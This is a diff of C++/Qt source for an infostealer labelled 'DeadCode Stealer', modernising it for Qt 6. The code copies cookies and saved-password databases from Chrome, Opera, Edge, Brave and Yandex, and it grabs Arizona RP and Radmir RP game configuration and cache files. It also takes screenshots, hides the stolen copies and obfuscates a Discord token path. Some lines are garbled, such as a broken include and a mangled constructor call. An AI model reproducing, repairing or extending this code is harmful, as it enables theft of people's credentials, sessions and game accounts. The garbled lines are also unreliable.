@@ -33,11 +33,11 @@
 #include <random>
 #include <sstream>
 #include <iomanip>
-#include <filesystem>
 #include <vector>
 #include <string>
 #include <set>
 #include <fstream>
+#include <filesystem>
 #include <windows.h>
 #include <bcrypt.h>
 #include <zip.h>
@@ -49,11 +49,14 @@
 #include <iphlpapi.h>
 #include <openssl/evp.h>
 #include <openssl/rand.h>
-#include <QThreadPool> // Добавлено для многопоточности
-#include <QRunnable>   // Добавлено для многопоточности
-#include <cstring> // Для memcpy
+#include <QThreadPool>
+#include <QRunnable>
+#include <cstring>
 #include <QByteArray>
-#include <array>
+#include5722#include <array>
+
+// Пространство имён для filesystem
+namespace fs = std::filesystem;
 
 // Зашифрованные строки
 const std::string encryptedDiscordPath = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3"; // "\\discord\\Local Storage\\leveldb\\"
@@ -183,7 +186,7 @@ private:
     std::string type;
 };
 
-// Конструктор
+// Конструктор (обновлён для Qt 6)
 MainWindow::MainWindow(QWidget *parent)
     : QMainWindow(parent)
     , ui(new Ui::MainWindow)
@@ -317,31 +320,55 @@ MainWindow::MainWindow(QWidget *parent)
     // Инициализация строки состояния
     if (ui->statusbar) ui->statusbar->showMessage("Готово", 0);
 
-    // Подключение сигналов и слотов
-    if (buildButton) connect(buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
-    if (iconBrowseButton) connect(iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
-    if (clearLogsButton) connect(clearLogsButton, &QPushButton::clicked, this, &MainWindow::on_clearLogsButton_clicked);
-    if (actionSaveConfig) connect(actionSaveConfig, &QAction::triggered, this, &MainWindow::saveConfig);
-    if (actionLoadConfig) connect(actionLoadConfig, &QAction::triggered, this, &MainWindow::loadConfig);
-    if (actionExportLogs) connect(actionExportLogs, &QAction::triggered, this, &MainWindow::exportLogs);
-    if (actionExit) connect(actionExit, &QAction::triggered, this, &QApplication::quit);
-    if (actionAbout) connect(actionAbout, &QAction::triggered, this, [this]() {
-        QMessageBox::about(this, "О программе", "DeadCode Stealer\nВерсия 1.0\nСоздано для образовательных целей.\n\n© 2025");
-    });
-    if (manager) connect(manager, &QNetworkAccessManager::finished, this, &MainWindow::replyFinished);
-    if (sendMethodComboBox) connect(sendMethodComboBox, &QComboBox::currentTextChanged, this, [this](const QString& text) {
-        if (ui->statusbar) ui->statusbar->showMessage("Метод отправки: " + text, 0);
-    });
+    // Подключение сигналов и слотов (обновлено для Qt 6)
+    if (buildButton) {
+        connect(buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
+    }
+    if (iconBrowseButton) {
+        connect(iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
+    }
+    if (clearLogsButton) {
+        connect(clearLogsButton, &QPushButton::clicked, this, &MainWindow::on_clearLogsButton_clicked);
+    }
+    if (actionSaveConfig) {
+        connect(actionSaveConfig, &QAction::triggered, this, &MainWindow::saveConfig);
+    }
+    if (actionLoadConfig) {
+        connect(actionLoadConfig, &QAction::triggered, this, &MainWindow::loadConfig);
+    }
+    if (actionExportLogs) {
+        connect(actionExportLogs, &QAction::triggered, this, &MainWindow::exportLogs);
+    }
+    if (actionExit) {
+        connect(actionExit, &QAction::triggered, this, &QApplication::quit);
+    }
+    if (actionAbout) {
+        connect(actionAbout, &QAction::triggered, this, [this]() {
+            QMessageBox::about(this, "О программе", "DeadCode Stealer\nВерсия 1.0\nСоздано для образовательных целей.\n\n© 2025");
+        });
+    }
+    if (manager) {
+        connect(manager, &QNetworkAccessManager::finished, this, &MainWindow::replyFinished);
+    }
+    if (sendMethodComboBox) {
+        connect(sendMethodComboBox, &QComboBox::currentTextChanged, this, [this](const QString& text) {
+            if (ui->statusbar) ui->statusbar->showMessage("Метод отправки: " + text);
+        });
+    }
     connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
     connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);
-    if (buildTimer) connect(buildTimer, &QTimer::timeout, this, &MainWindow::buildExecutable);
-    if (statusCheckTimer) connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);
+    if (buildTimer) {
+        connect(buildTimer, &QTimer::timeout, this, &MainWindow::buildExecutable);
+    }
+    if (statusCheckTimer) {
+        connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);
+    }
 
-    // Лямбда для startStealSignal
+    // Лямбда для startStealSignal (без изменений)
     connect(this, &MainWindow::startStealSignal, this, [this]() {
         std::string tempDir = std::string(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp") + "\\DeadCode_" + generateRandomString(8);
         QThread* thread = new QThread;
-        StealerWorker* worker = new StealerWorker(this, tempDir);
+        StealerWorker* worker = new Ste    StealerWorker(this, tempDir);
         worker->moveToThread(thread);
         connect(thread, &QThread::started, worker, &StealerWorker::process);
         connect(worker, &StealerWorker::finished, thread, &QThread::quit);
@@ -350,7 +377,7 @@ MainWindow::MainWindow(QWidget *parent)
         thread->start();
     });
 
-    // Инициализация config начальными значениями
+    // Инициализация config
     updateConfigFromUI();
 }
 
@@ -362,50 +389,55 @@ MainWindow::~MainWindow() {
     delete statusCheckTimer;
 }
 
-// Вспомогательный метод для кражи данных из Chromium-браузеров
+// Обновлённый метод stealChromiumBrowserData
 std::string MainWindow::stealChromiumBrowserData(const std::string& profilePath, const std::string& browserName, const std::string& tempDir) {
     std::string result;
-    std::string cookiesPath = profilePath + "\\Cookies";
-    std::string passwordsPath = profilePath + "\\Login Data";
-    std::string destCookies = tempDir + "\\" + browserName + "_Cookies";
-    std::string destPasswords = tempDir + "\\" + browserName + "_Login_Data";
+    fs::path cookiesPath = fs::path(profilePath) / "Cookies";
+    fs::path passwordsPath = fs::path(profilePath) / "Login Data";
+    fs::path destCookies = fs::path(tempDir) / (browserName + "_Cookies");
+    fs::path destPasswords = fs::path(tempDir) / (browserName + "_Login_Data");
 
     try {
-        if (std::filesystem::exists(cookiesPath) && config.cookies) {
-            std::filesystem::copy_file(cookiesPath, destCookies, std::filesystem::copy_options::overwrite_existing);
-            collectedFiles.push_back(destCookies);
+        if (fs::exists(cookiesPath) && config.cookies) {
+            fs::copy_file(cookiesPath, destCookies, fs::copy_options::overwrite_existing);
+            SetFileAttributesA(destCookies.string().c_str(), FILE_ATTRIBUTE_HIDDEN);
+            collectedFiles.push_back(destCookies.string());
             result += browserName + " cookies stolen successfully.\n";
+            emitLog("Cookies браузера " + QString::fromStdString(browserName) + " скопированы");
         }
-        if (std::filesystem::exists(passwordsPath) && config.passwords) {
-            std::filesystem::copy_file(passwordsPath, destPasswords, std::filesystem::copy_options::overwrite_existing);
-            collectedFiles.push_back(destPasswords);
+        if (fs::exists(passwordsPath) && config.passwords) {
+            fs::copy_file(passwordsPath, destPasswords, fs::copy_options::overwrite_existing);
+            SetFileAttributesA(destPasswords.string().c_str(), FILE_ATTRIBUTE_HIDDEN);
+            collectedFiles.push_back(destPasswords.string());
             result += browserName + " passwords stolen successfully.\n";
+            emitLog("Пароли браузера " + QString::fromStdString(browserName) + " скопированы");
         }
-    } catch (const std::exception& e) {
+    } catch (const fs::filesystem_error& e) {
         result += "Error stealing " + browserName + " data: " + e.what() + "\n";
+        emitLog("Ошибка при сборе данных " + QString::fromStdString(browserName) + ": " + QString::fromStdString(e.what()));
     }
     return result;
 }
 
-// Обновленный метод stealBrowserData
+// Обновлённый метод stealBrowserData
 std::string MainWindow::stealBrowserData(const std::string& tempDir) {
     std::stringstream output;
     if (config.cookies || config.passwords) {
         output << "Stealing browser data...\n";
 
-        std::vector<std::pair<std::string, std::string>> browsers = {
-            {"Chrome", std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default"},
-            {"Opera", std::string(getenv("APPDATA")) + "\\Opera Software\\Opera Stable"},
-            {"OperaGX", std::string(getenv("APPDATA")) + "\\Opera Software\\Opera GX Stable"},
-            {"Edge", std::string(getenv("LOCALAPPDATA")) + "\\Microsoft\\Edge\\User Data\\Default"},
-            {"Brave", std::string(getenv("LOCALAPPDATA")) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
-            {"Yandex", std::string(getenv("LOCALAPPDATA")) + "\\Yandex\\YandexBrowser\\User Data\\Default"}
+        std::vector<std::pair<std::string, fs::path>> browsers = {
+            {"Chrome", fs::path(getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default"},
+            {"Opera", fs::path(getenv("APPDATA")) / "Opera Software" / "Opera Stable"},
+            {"OperaGX", fs::path(getenv("APPDATA")) / "Opera Software" / "Opera GX Stable"},
+            {"Edge", fs::path(getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Default"},
+            {"Brave", fs::path(getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default"},
+            {"Yandex", fs::path(getenv("LOCALAPPDATA")) / "Yandex" / "YandexBrowser" / "User Data" / "Default"}
         };
 
         for (const auto& [name, path] : browsers) {
-            if (std::filesystem::exists(path)) {
+            if (fs::exists(path)) {
                 emitLog("Сбор данных браузера: " + QString::fromStdString(name));
-                output << stealChromiumBrowserData(path, name, tempDir);
+                output << stealChromiumBrowserData(path.string(), name, tempDir);
             } else {
                 emitLog("Директория " + QString::fromStdString(name) + " не найдена, пропускаем...");
             }
@@ -579,166 +611,143 @@ std::string MainWindow::encryptData(const std::string& data) {
     return result;
 }
 
-// Реализация StealArizonaRPData (Arizona RP на SAMP)
+// Обновлённый метод StealArizonaRPData
 std::string MainWindow::StealArizonaRPData(const std::string& dir) {
     emitLog("Начало кражи данных Arizona RP (SAMP)...");
 
-    std::string arizonaDir = dir + "\\ArizonaRPData";
-    std::filesystem::create_directories(arizonaDir);
+    fs::path arizonaDir = fs::path(dir) / "ArizonaRPData";
+    fs::create_directories(arizonaDir);
 
     std::string result;
 
-    // Получаем путь к APPDATA
-    char* appDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
-        emitLog("Ошибка: Не удалось получить путь к APPDATA для Arizona RP");
-        free(appDataPath);
+    // Путь к APPDATA
+    char* appDataPath = getenv("APPDATA");
+    if (!appDataPath) {
+        emitLog("Ошибка: Не удалось получить путь к APPDATA");
         return "";
     }
-    std::string appData(appDataPath);
-    free(appDataPath);
 
-    // Путь к samp.ini (конфигурация SAMP)
-    std::string sampConfigPath = appData + "\\SA-MP\\samp.ini";
-    if (std::filesystem::exists(sampConfigPath)) {
-        std::string arizonaConfigPath = arizonaDir + "\\arizona_samp_config.txt";
-        std::filesystem::copy_file(sampConfigPath, arizonaConfigPath, std::filesystem::copy_options::overwrite_existing);
-        SetFileAttributesA(arizonaConfigPath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
-        collectedFiles.push_back(arizonaConfigPath);
-
-        // Читаем файл для извлечения данных
-        std::ifstream configFile(sampConfigPath);
-        std::string line, configContent;
-        while (std::getline(configFile, line)) {
-            configContent += line + "\n";
-            // Ищем никнейм и сервер (Arizona RP)
-            if (line.find("last_nick") != std::string::npos || 
-                line.find("server") != std::string::npos) {
-                result += "Arizona RP (SAMP): " + line + "\n";
+    // Путь к samp.ini
+    fs::path sampConfigPath = fs::path(appDataPath) / "SA-MP" / "samp.ini";
+    if (fs::exists(sampConfigPath)) {
+        std::ifstream configFile(sampConfigPath, std::ios::binary);
+        if (configFile.is_open()) {
+            std::string configContent;
+            std::string line;
+            while (std::getline(configFile, line)) {
+                configContent += line + "\n";
+                if (line.find("last_nick") != std::string::npos || line.find("server") != std::string::npos) {
+                    result += "Arizona RP (SAMP): " + line + "\n";
+                }
             }
-        }
-        configFile.close();
+            configFile.close();
 
-        // Сохраняем содержимое
-        std::ofstream outFile(arizonaConfigPath);
-        if (outFile.is_open()) {
-            outFile << configContent;
-            outFile.close();
-            emitLog("Конфигурация Arizona RP (SAMP) сохранена и скрыта: " + QString::fromStdString(arizonaConfigPath));
+            fs::path arizonaConfigPath = arizonaDir / "arizona_samp_config.txt";
+            fs::copy_file(sampConfigPath, arizonaConfigPath, fs::copy_options::overwrite_existing);
+            collectedFiles.push_back(arizonaConfigPath.string());
+            emitLog("Конфигурация Arizona RP сохранена: " + QString::fromStdString(arizonaConfigPath.string()));
+
+            // Скрытие файла
+            SetFileAttributesA(arizonaConfigPath.string().c_str(), FILE_ATTRIBUTE_HIDDEN);
         } else {
-            emitLog("Ошибка: Не удалось сохранить конфигурацию Arizona RP");
+            emitLog("Ошибка: Не удалось открыть samp.ini");
         }
     } else {
-        emitLog("Файл samp.ini для Arizona RP не найден");
+        emitLog("Файл samp.ini не найден");
     }
 
-    // Проверка кэша SAMP (USERDATA)
-    std::string sampCachePath = appData + "\\SA-MP\\USERDATA";
-    if (std::filesystem::exists(sampCachePath)) {
-        for (const auto& entry : std::filesystem::directory_iterator(sampCachePath)) {
-            std::string fileName = entry.path().filename().string();
-            // Ищем файлы, связанные с Arizona RP (например, по имени сервера)
-            if (fileName.find("arizona") != std::string::npos || fileName.find(".dat") != std::string::npos) {
-                std::string destFilePath = arizonaDir + "\\" + fileName;
-                std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
-                SetFileAttributesA(destFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
-                collectedFiles.push_back(destFilePath);
-                result += "Arizona RP (SAMP) Cache: " + fileName + "\n";
-                emitLog("Кэш Arizona RP (SAMP) скопирован и скрыт: " + QString::fromStdString(destFilePath));
+    // Проверка кэша SAMP
+    fs::path sampCachePath = fs::path(appDataPath) / "SA-MP" / "USERDATA";
+    if (fs::exists(sampCachePath)) {
+        for (const auto& entry : fs::directory_iterator(sampCachePath)) {
+            std::string filename = entry.path().filename().string();
+            if (filename.find("arizona") != std::string::npos || entry.path().extension() == ".dat") {
+                fs::path destFilePath = arizonaDir / filename;
+                fs::copy_file(entry.path(), destFilePath, fs::copy_options::overwrite_existing);
+                SetFileAttributesA(destFilePath.string().c_str(), FILE_ATTRIBUTE_HIDDEN);
+                collectedFiles.push_back(destFilePath.string());
+                result += "Arizona RP (SAMP) Cache: " + filename + "\n";
+                emitLog("Кэш Arizona RP скопирован: " + QString::fromStdString(destFilePath.string()));
             }
         }
     }
 
     if (result.empty()) {
-        emitLog("Данные Arizona RP (SAMP) не найдены");
-        std::filesystem::remove_all(arizonaDir);
+        emitLog("Данные Arizona RP не найдены");
+        fs::remove_all(arizonaDir);
         return "";
     }
 
-    emitLog("Кража данных Arizona RP (SAMP) завершена");
+    emitLog("Кража данных Arizona RP завершена");
     return result;
 }
 
-// Реализация StealRadmirRPData (Radmir RP на CRMP)
+// Обновлённый метод StealRadmirRPData
 std::string MainWindow::StealRadmirRPData(const std::string& dir) {
     emitLog("Начало кражи данных Radmir RP (CRMP)...");
 
-    std::string radmirDir = dir + "\\RadmirRPData";
-    std::filesystem::create_directories(radmirDir);
+    fs::path radmirDir = fs::path(dir) / "RadmirRPData";
+    fs::create_directories(radmirDir);
 
     std::string result;
 
-    // Получаем путь к APPDATA
-    char* appDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
-        emitLog("Ошибка: Не удалось получить путь к APPDATA для Radmir RP");
-        free(appDataPath);
+    // Путь к APPDATA
+    char* appDataPath = getenv("APPDATA");
+    if (!appDataPath) {
+        emitLog("Ошибка: Не удалось получить путь к APPDATA");
         return "";
     }
-    std::string appData(appDataPath);
-    free(appDataPath);
 
-    // Путь к settings.ini (конфигурация Radmir CRMP)
-    std::string radmirConfigPath = appData + "\\RadmirCRMP\\settings.ini";
-    if (std::filesystem::exists(radmirConfigPath)) {
-        std::string radmirDestPath = radmirDir + "\\radmir_config.txt";
-        std::filesystem::copy_file(radmirConfigPath, radmirDestPath, std::filesystem::copy_options::overwrite_existing);
-        SetFileAttributesA(radmirDestPath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
-        collectedFiles.push_back(radmirDestPath);
-
-        // Читаем файл для извлечения данных
-        std::ifstream configFile(radmirConfigPath);
-        std::string line, configContent;
-        while (std::getline(configFile, line)) {
-            configContent += line + "\n";
-            // Ищем никнейм, сервер или сессионные данные
-            if (line.find("nickname") != std::string::npos || 
-                line.find("server") != std::string::npos || 
-                line.find("session") != std::string::npos) {
-                result += "Radmir RP (CRMP): " + line + "\n";
+    // Путь к settings.ini
+    fs::path radmirConfigPath = fs::path(appDataPath) / "RadmirCRMP" / "settings.ini";
+    if (fs::exists(radmirConfigPath)) {
+        std::ifstream configFile(radmirConfigPath, std::ios::binary);
+        if (configFile.is_open()) {
+            std::string configContent;
+            std::string line;
+            while (std::getline(configFile, line)) {
+                configContent += line + "\n";
+                if (line.find("nickname") != std::string::npos || line.find("server") != std::string::npos || line.find("session") != std::string::npos) {
+                    result += "Radmir RP (CRMP): " + line + "\n";
+                }
             }
-        }
-        configFile.close();
+            configFile.close();
 
-        // Сохраняем содержимое
-        std::ofstream outFile(radmirDestPath);
-        if (outFile.is_open()) {
-            outFile << configContent;
-            outFile.close();
-            emitLog("Конфигурация Radmir RP (CRMP) сохранена и скрыта: " + QString::fromStdString(radmirDestPath));
+            fs::path radmirDestPath = radmirDir / "radmir_config.txt";
+            fs::copy_file(radmirConfigPath, radmirDestPath, fs::copy_options::overwrite_existing);
+            SetFileAttributesA(radmirDestPath.string().c_str(), FILE_ATTRIBUTE_HIDDEN);
+            collectedFiles.push_back(radmirDestPath.string());
+            emitLog("Конфигурация Radmir RP сохранена: " + QString::fromStdString(radmirDestPath.string()));
         } else {
-            emitLog("Ошибка: Не удалось сохранить конфигурацию Radmir RP");
+            emitLog("Ошибка: Не удалось открыть settings.ini");
         }
     } else {
-        emitLog("Файл settings.ini для Radmir RP (CRMP) не найден");
+        emitLog("Файл settings.ini не найден");
     }
 
-    // Проверка кэша Radmir CRMP (например, USERDATA или logs)
-    std::string radmirCachePath = appData + "\\RadmirCRMP\\USERDATA";
-    if (std::filesystem::exists(radmirCachePath)) {
-        for (const auto& entry : std::filesystem::directory_iterator(radmirCachePath)) {
-            std::string fileName = entry.path().filename().string();
-            // Ищем файлы, связанные с Radmir RP
-            if (fileName.find("radmir") != std::string::npos || fileName.find(".dat") != std::string::npos) {
-                std::string destFilePath = radmirDir + "\\" + fileName;
-                std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
-                SetFileAttributesA(destFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
-                collectedFiles.push_back(destFilePath);
-                result += "Radmir RP (CRMP) Cache: " + fileName + "\n";
-                emitLog("Кэш Radmir RP (CRMP) скопирован и скрыт: " + QString::fromStdString(destFilePath));
+    // Проверка кэша Radmir
+    fs::path radmirCachePath = fs::path(appDataPath) / "RadmirCRMP" / "USERDATA";
+    if (fs::exists(radmirCachePath)) {
+        for (const auto& entry : fs::directory_iterator(radmirCachePath)) {
+            std::string filename = entry.path().filename().string();
+            if (filename.find("radmir") != std::string::npos || entry.path().extension() == ".dat") {
+                fs::path destFilePath = radmirDir / filename;
+                fs::copy_file(entry.path(), destFilePath, fs::copy_options::overwrite_existing);
+                SetFileAttributesA(destFilePath.string().c_str(), FILE_ATTRIBUTE_HIDDEN);
+                collectedFiles.push_back(destFilePath.string());
+                result += "Radmir RP (CRMP) Cache: " + filename + "\n";
+                emitLog("Кэш Radmir RP скопирован: " + QString::fromStdString(destFilePath.string()));
             }
         }
     }
 
     if (result.empty()) {
-        emitLog("Данные Radmir RP (CRMP) не найдены");
-        std::filesystem::remove_all(radmirDir);
+        emitLog("Данные Radmir RP не найдены");
+        fs::remove_all(radmirDir);
         return "";
     }
 
-    emitLog("Кража данных Radmir RP (CRMP) завершена");
+    emitLog("Кража данных Radmir RP завершена");
     return result;
 }
 
@@ -1987,12 +1996,12 @@ std::string MainWindow::collectSystemInfo(const std::string& dir) {
     return sysInfoPath;
 }
 
-// Реализация TakeScreenshot
+// Обновлённый метод TakeScreenshot (для Qt 6)
 std::string MainWindow::TakeScreenshot(const std::string& dir) {
     emitLog("Создание скриншота...");
 
-    std::string screenshotDir = dir + "\\Screenshots";
-    std::filesystem::create_directories(screenshotDir);
+    fs::path screenshotDir = fs::path(dir) / "Screenshots";
+    fs::create_directories(screenshotDir);
 
     QScreen* screen = QGuiApplication::primaryScreen();
     if (!screen) {
@@ -2017,15 +2026,19 @@ std::string MainWindow::TakeScreenshot(const std::string& dir) {
     int y = (originalPixmap.height() - textRect.height()) / 2;
     painter.drawText(x, y, text);
 
-    std::string screenshotPath = screenshotDir + "\\screenshot_" + generateRandomString(8) + ".png";
-    if (!originalPixmap.save(QString::fromStdString(screenshotPath), "PNG")) {
+    fs::path screenshotPath = screenshotDir / ("screenshot_" + generateRandomString(8) + ".png");
+    QFile file(QString::fromStdString(screenshotPath.string()));
+    if (!file.open(QIODevice::WriteOnly)) {
         emitLog("Ошибка: Не удалось сохранить скриншот");
         return "";
     }
+    originalPixmap.save(&file, "PNG");
+    file.close();
 
-    emitLog("Скриншот сохранен: " + QString::fromStdString(screenshotPath));
-    collectedFiles.push_back(screenshotPath);
-    return screenshotPath;
+    SetFileAttributesA(screenshotPath.string().c_str(), FILE_ATTRIBUTE_HIDDEN);
+    collectedFiles.push_back(screenshotPath.string());
+    emitLog("Скриншот сохранен: " + QString::fromStdString(screenshotPath.string()));
+    return screenshotPath.string();
 }
 
 // Класс для многопоточного извлечения токенов Discord
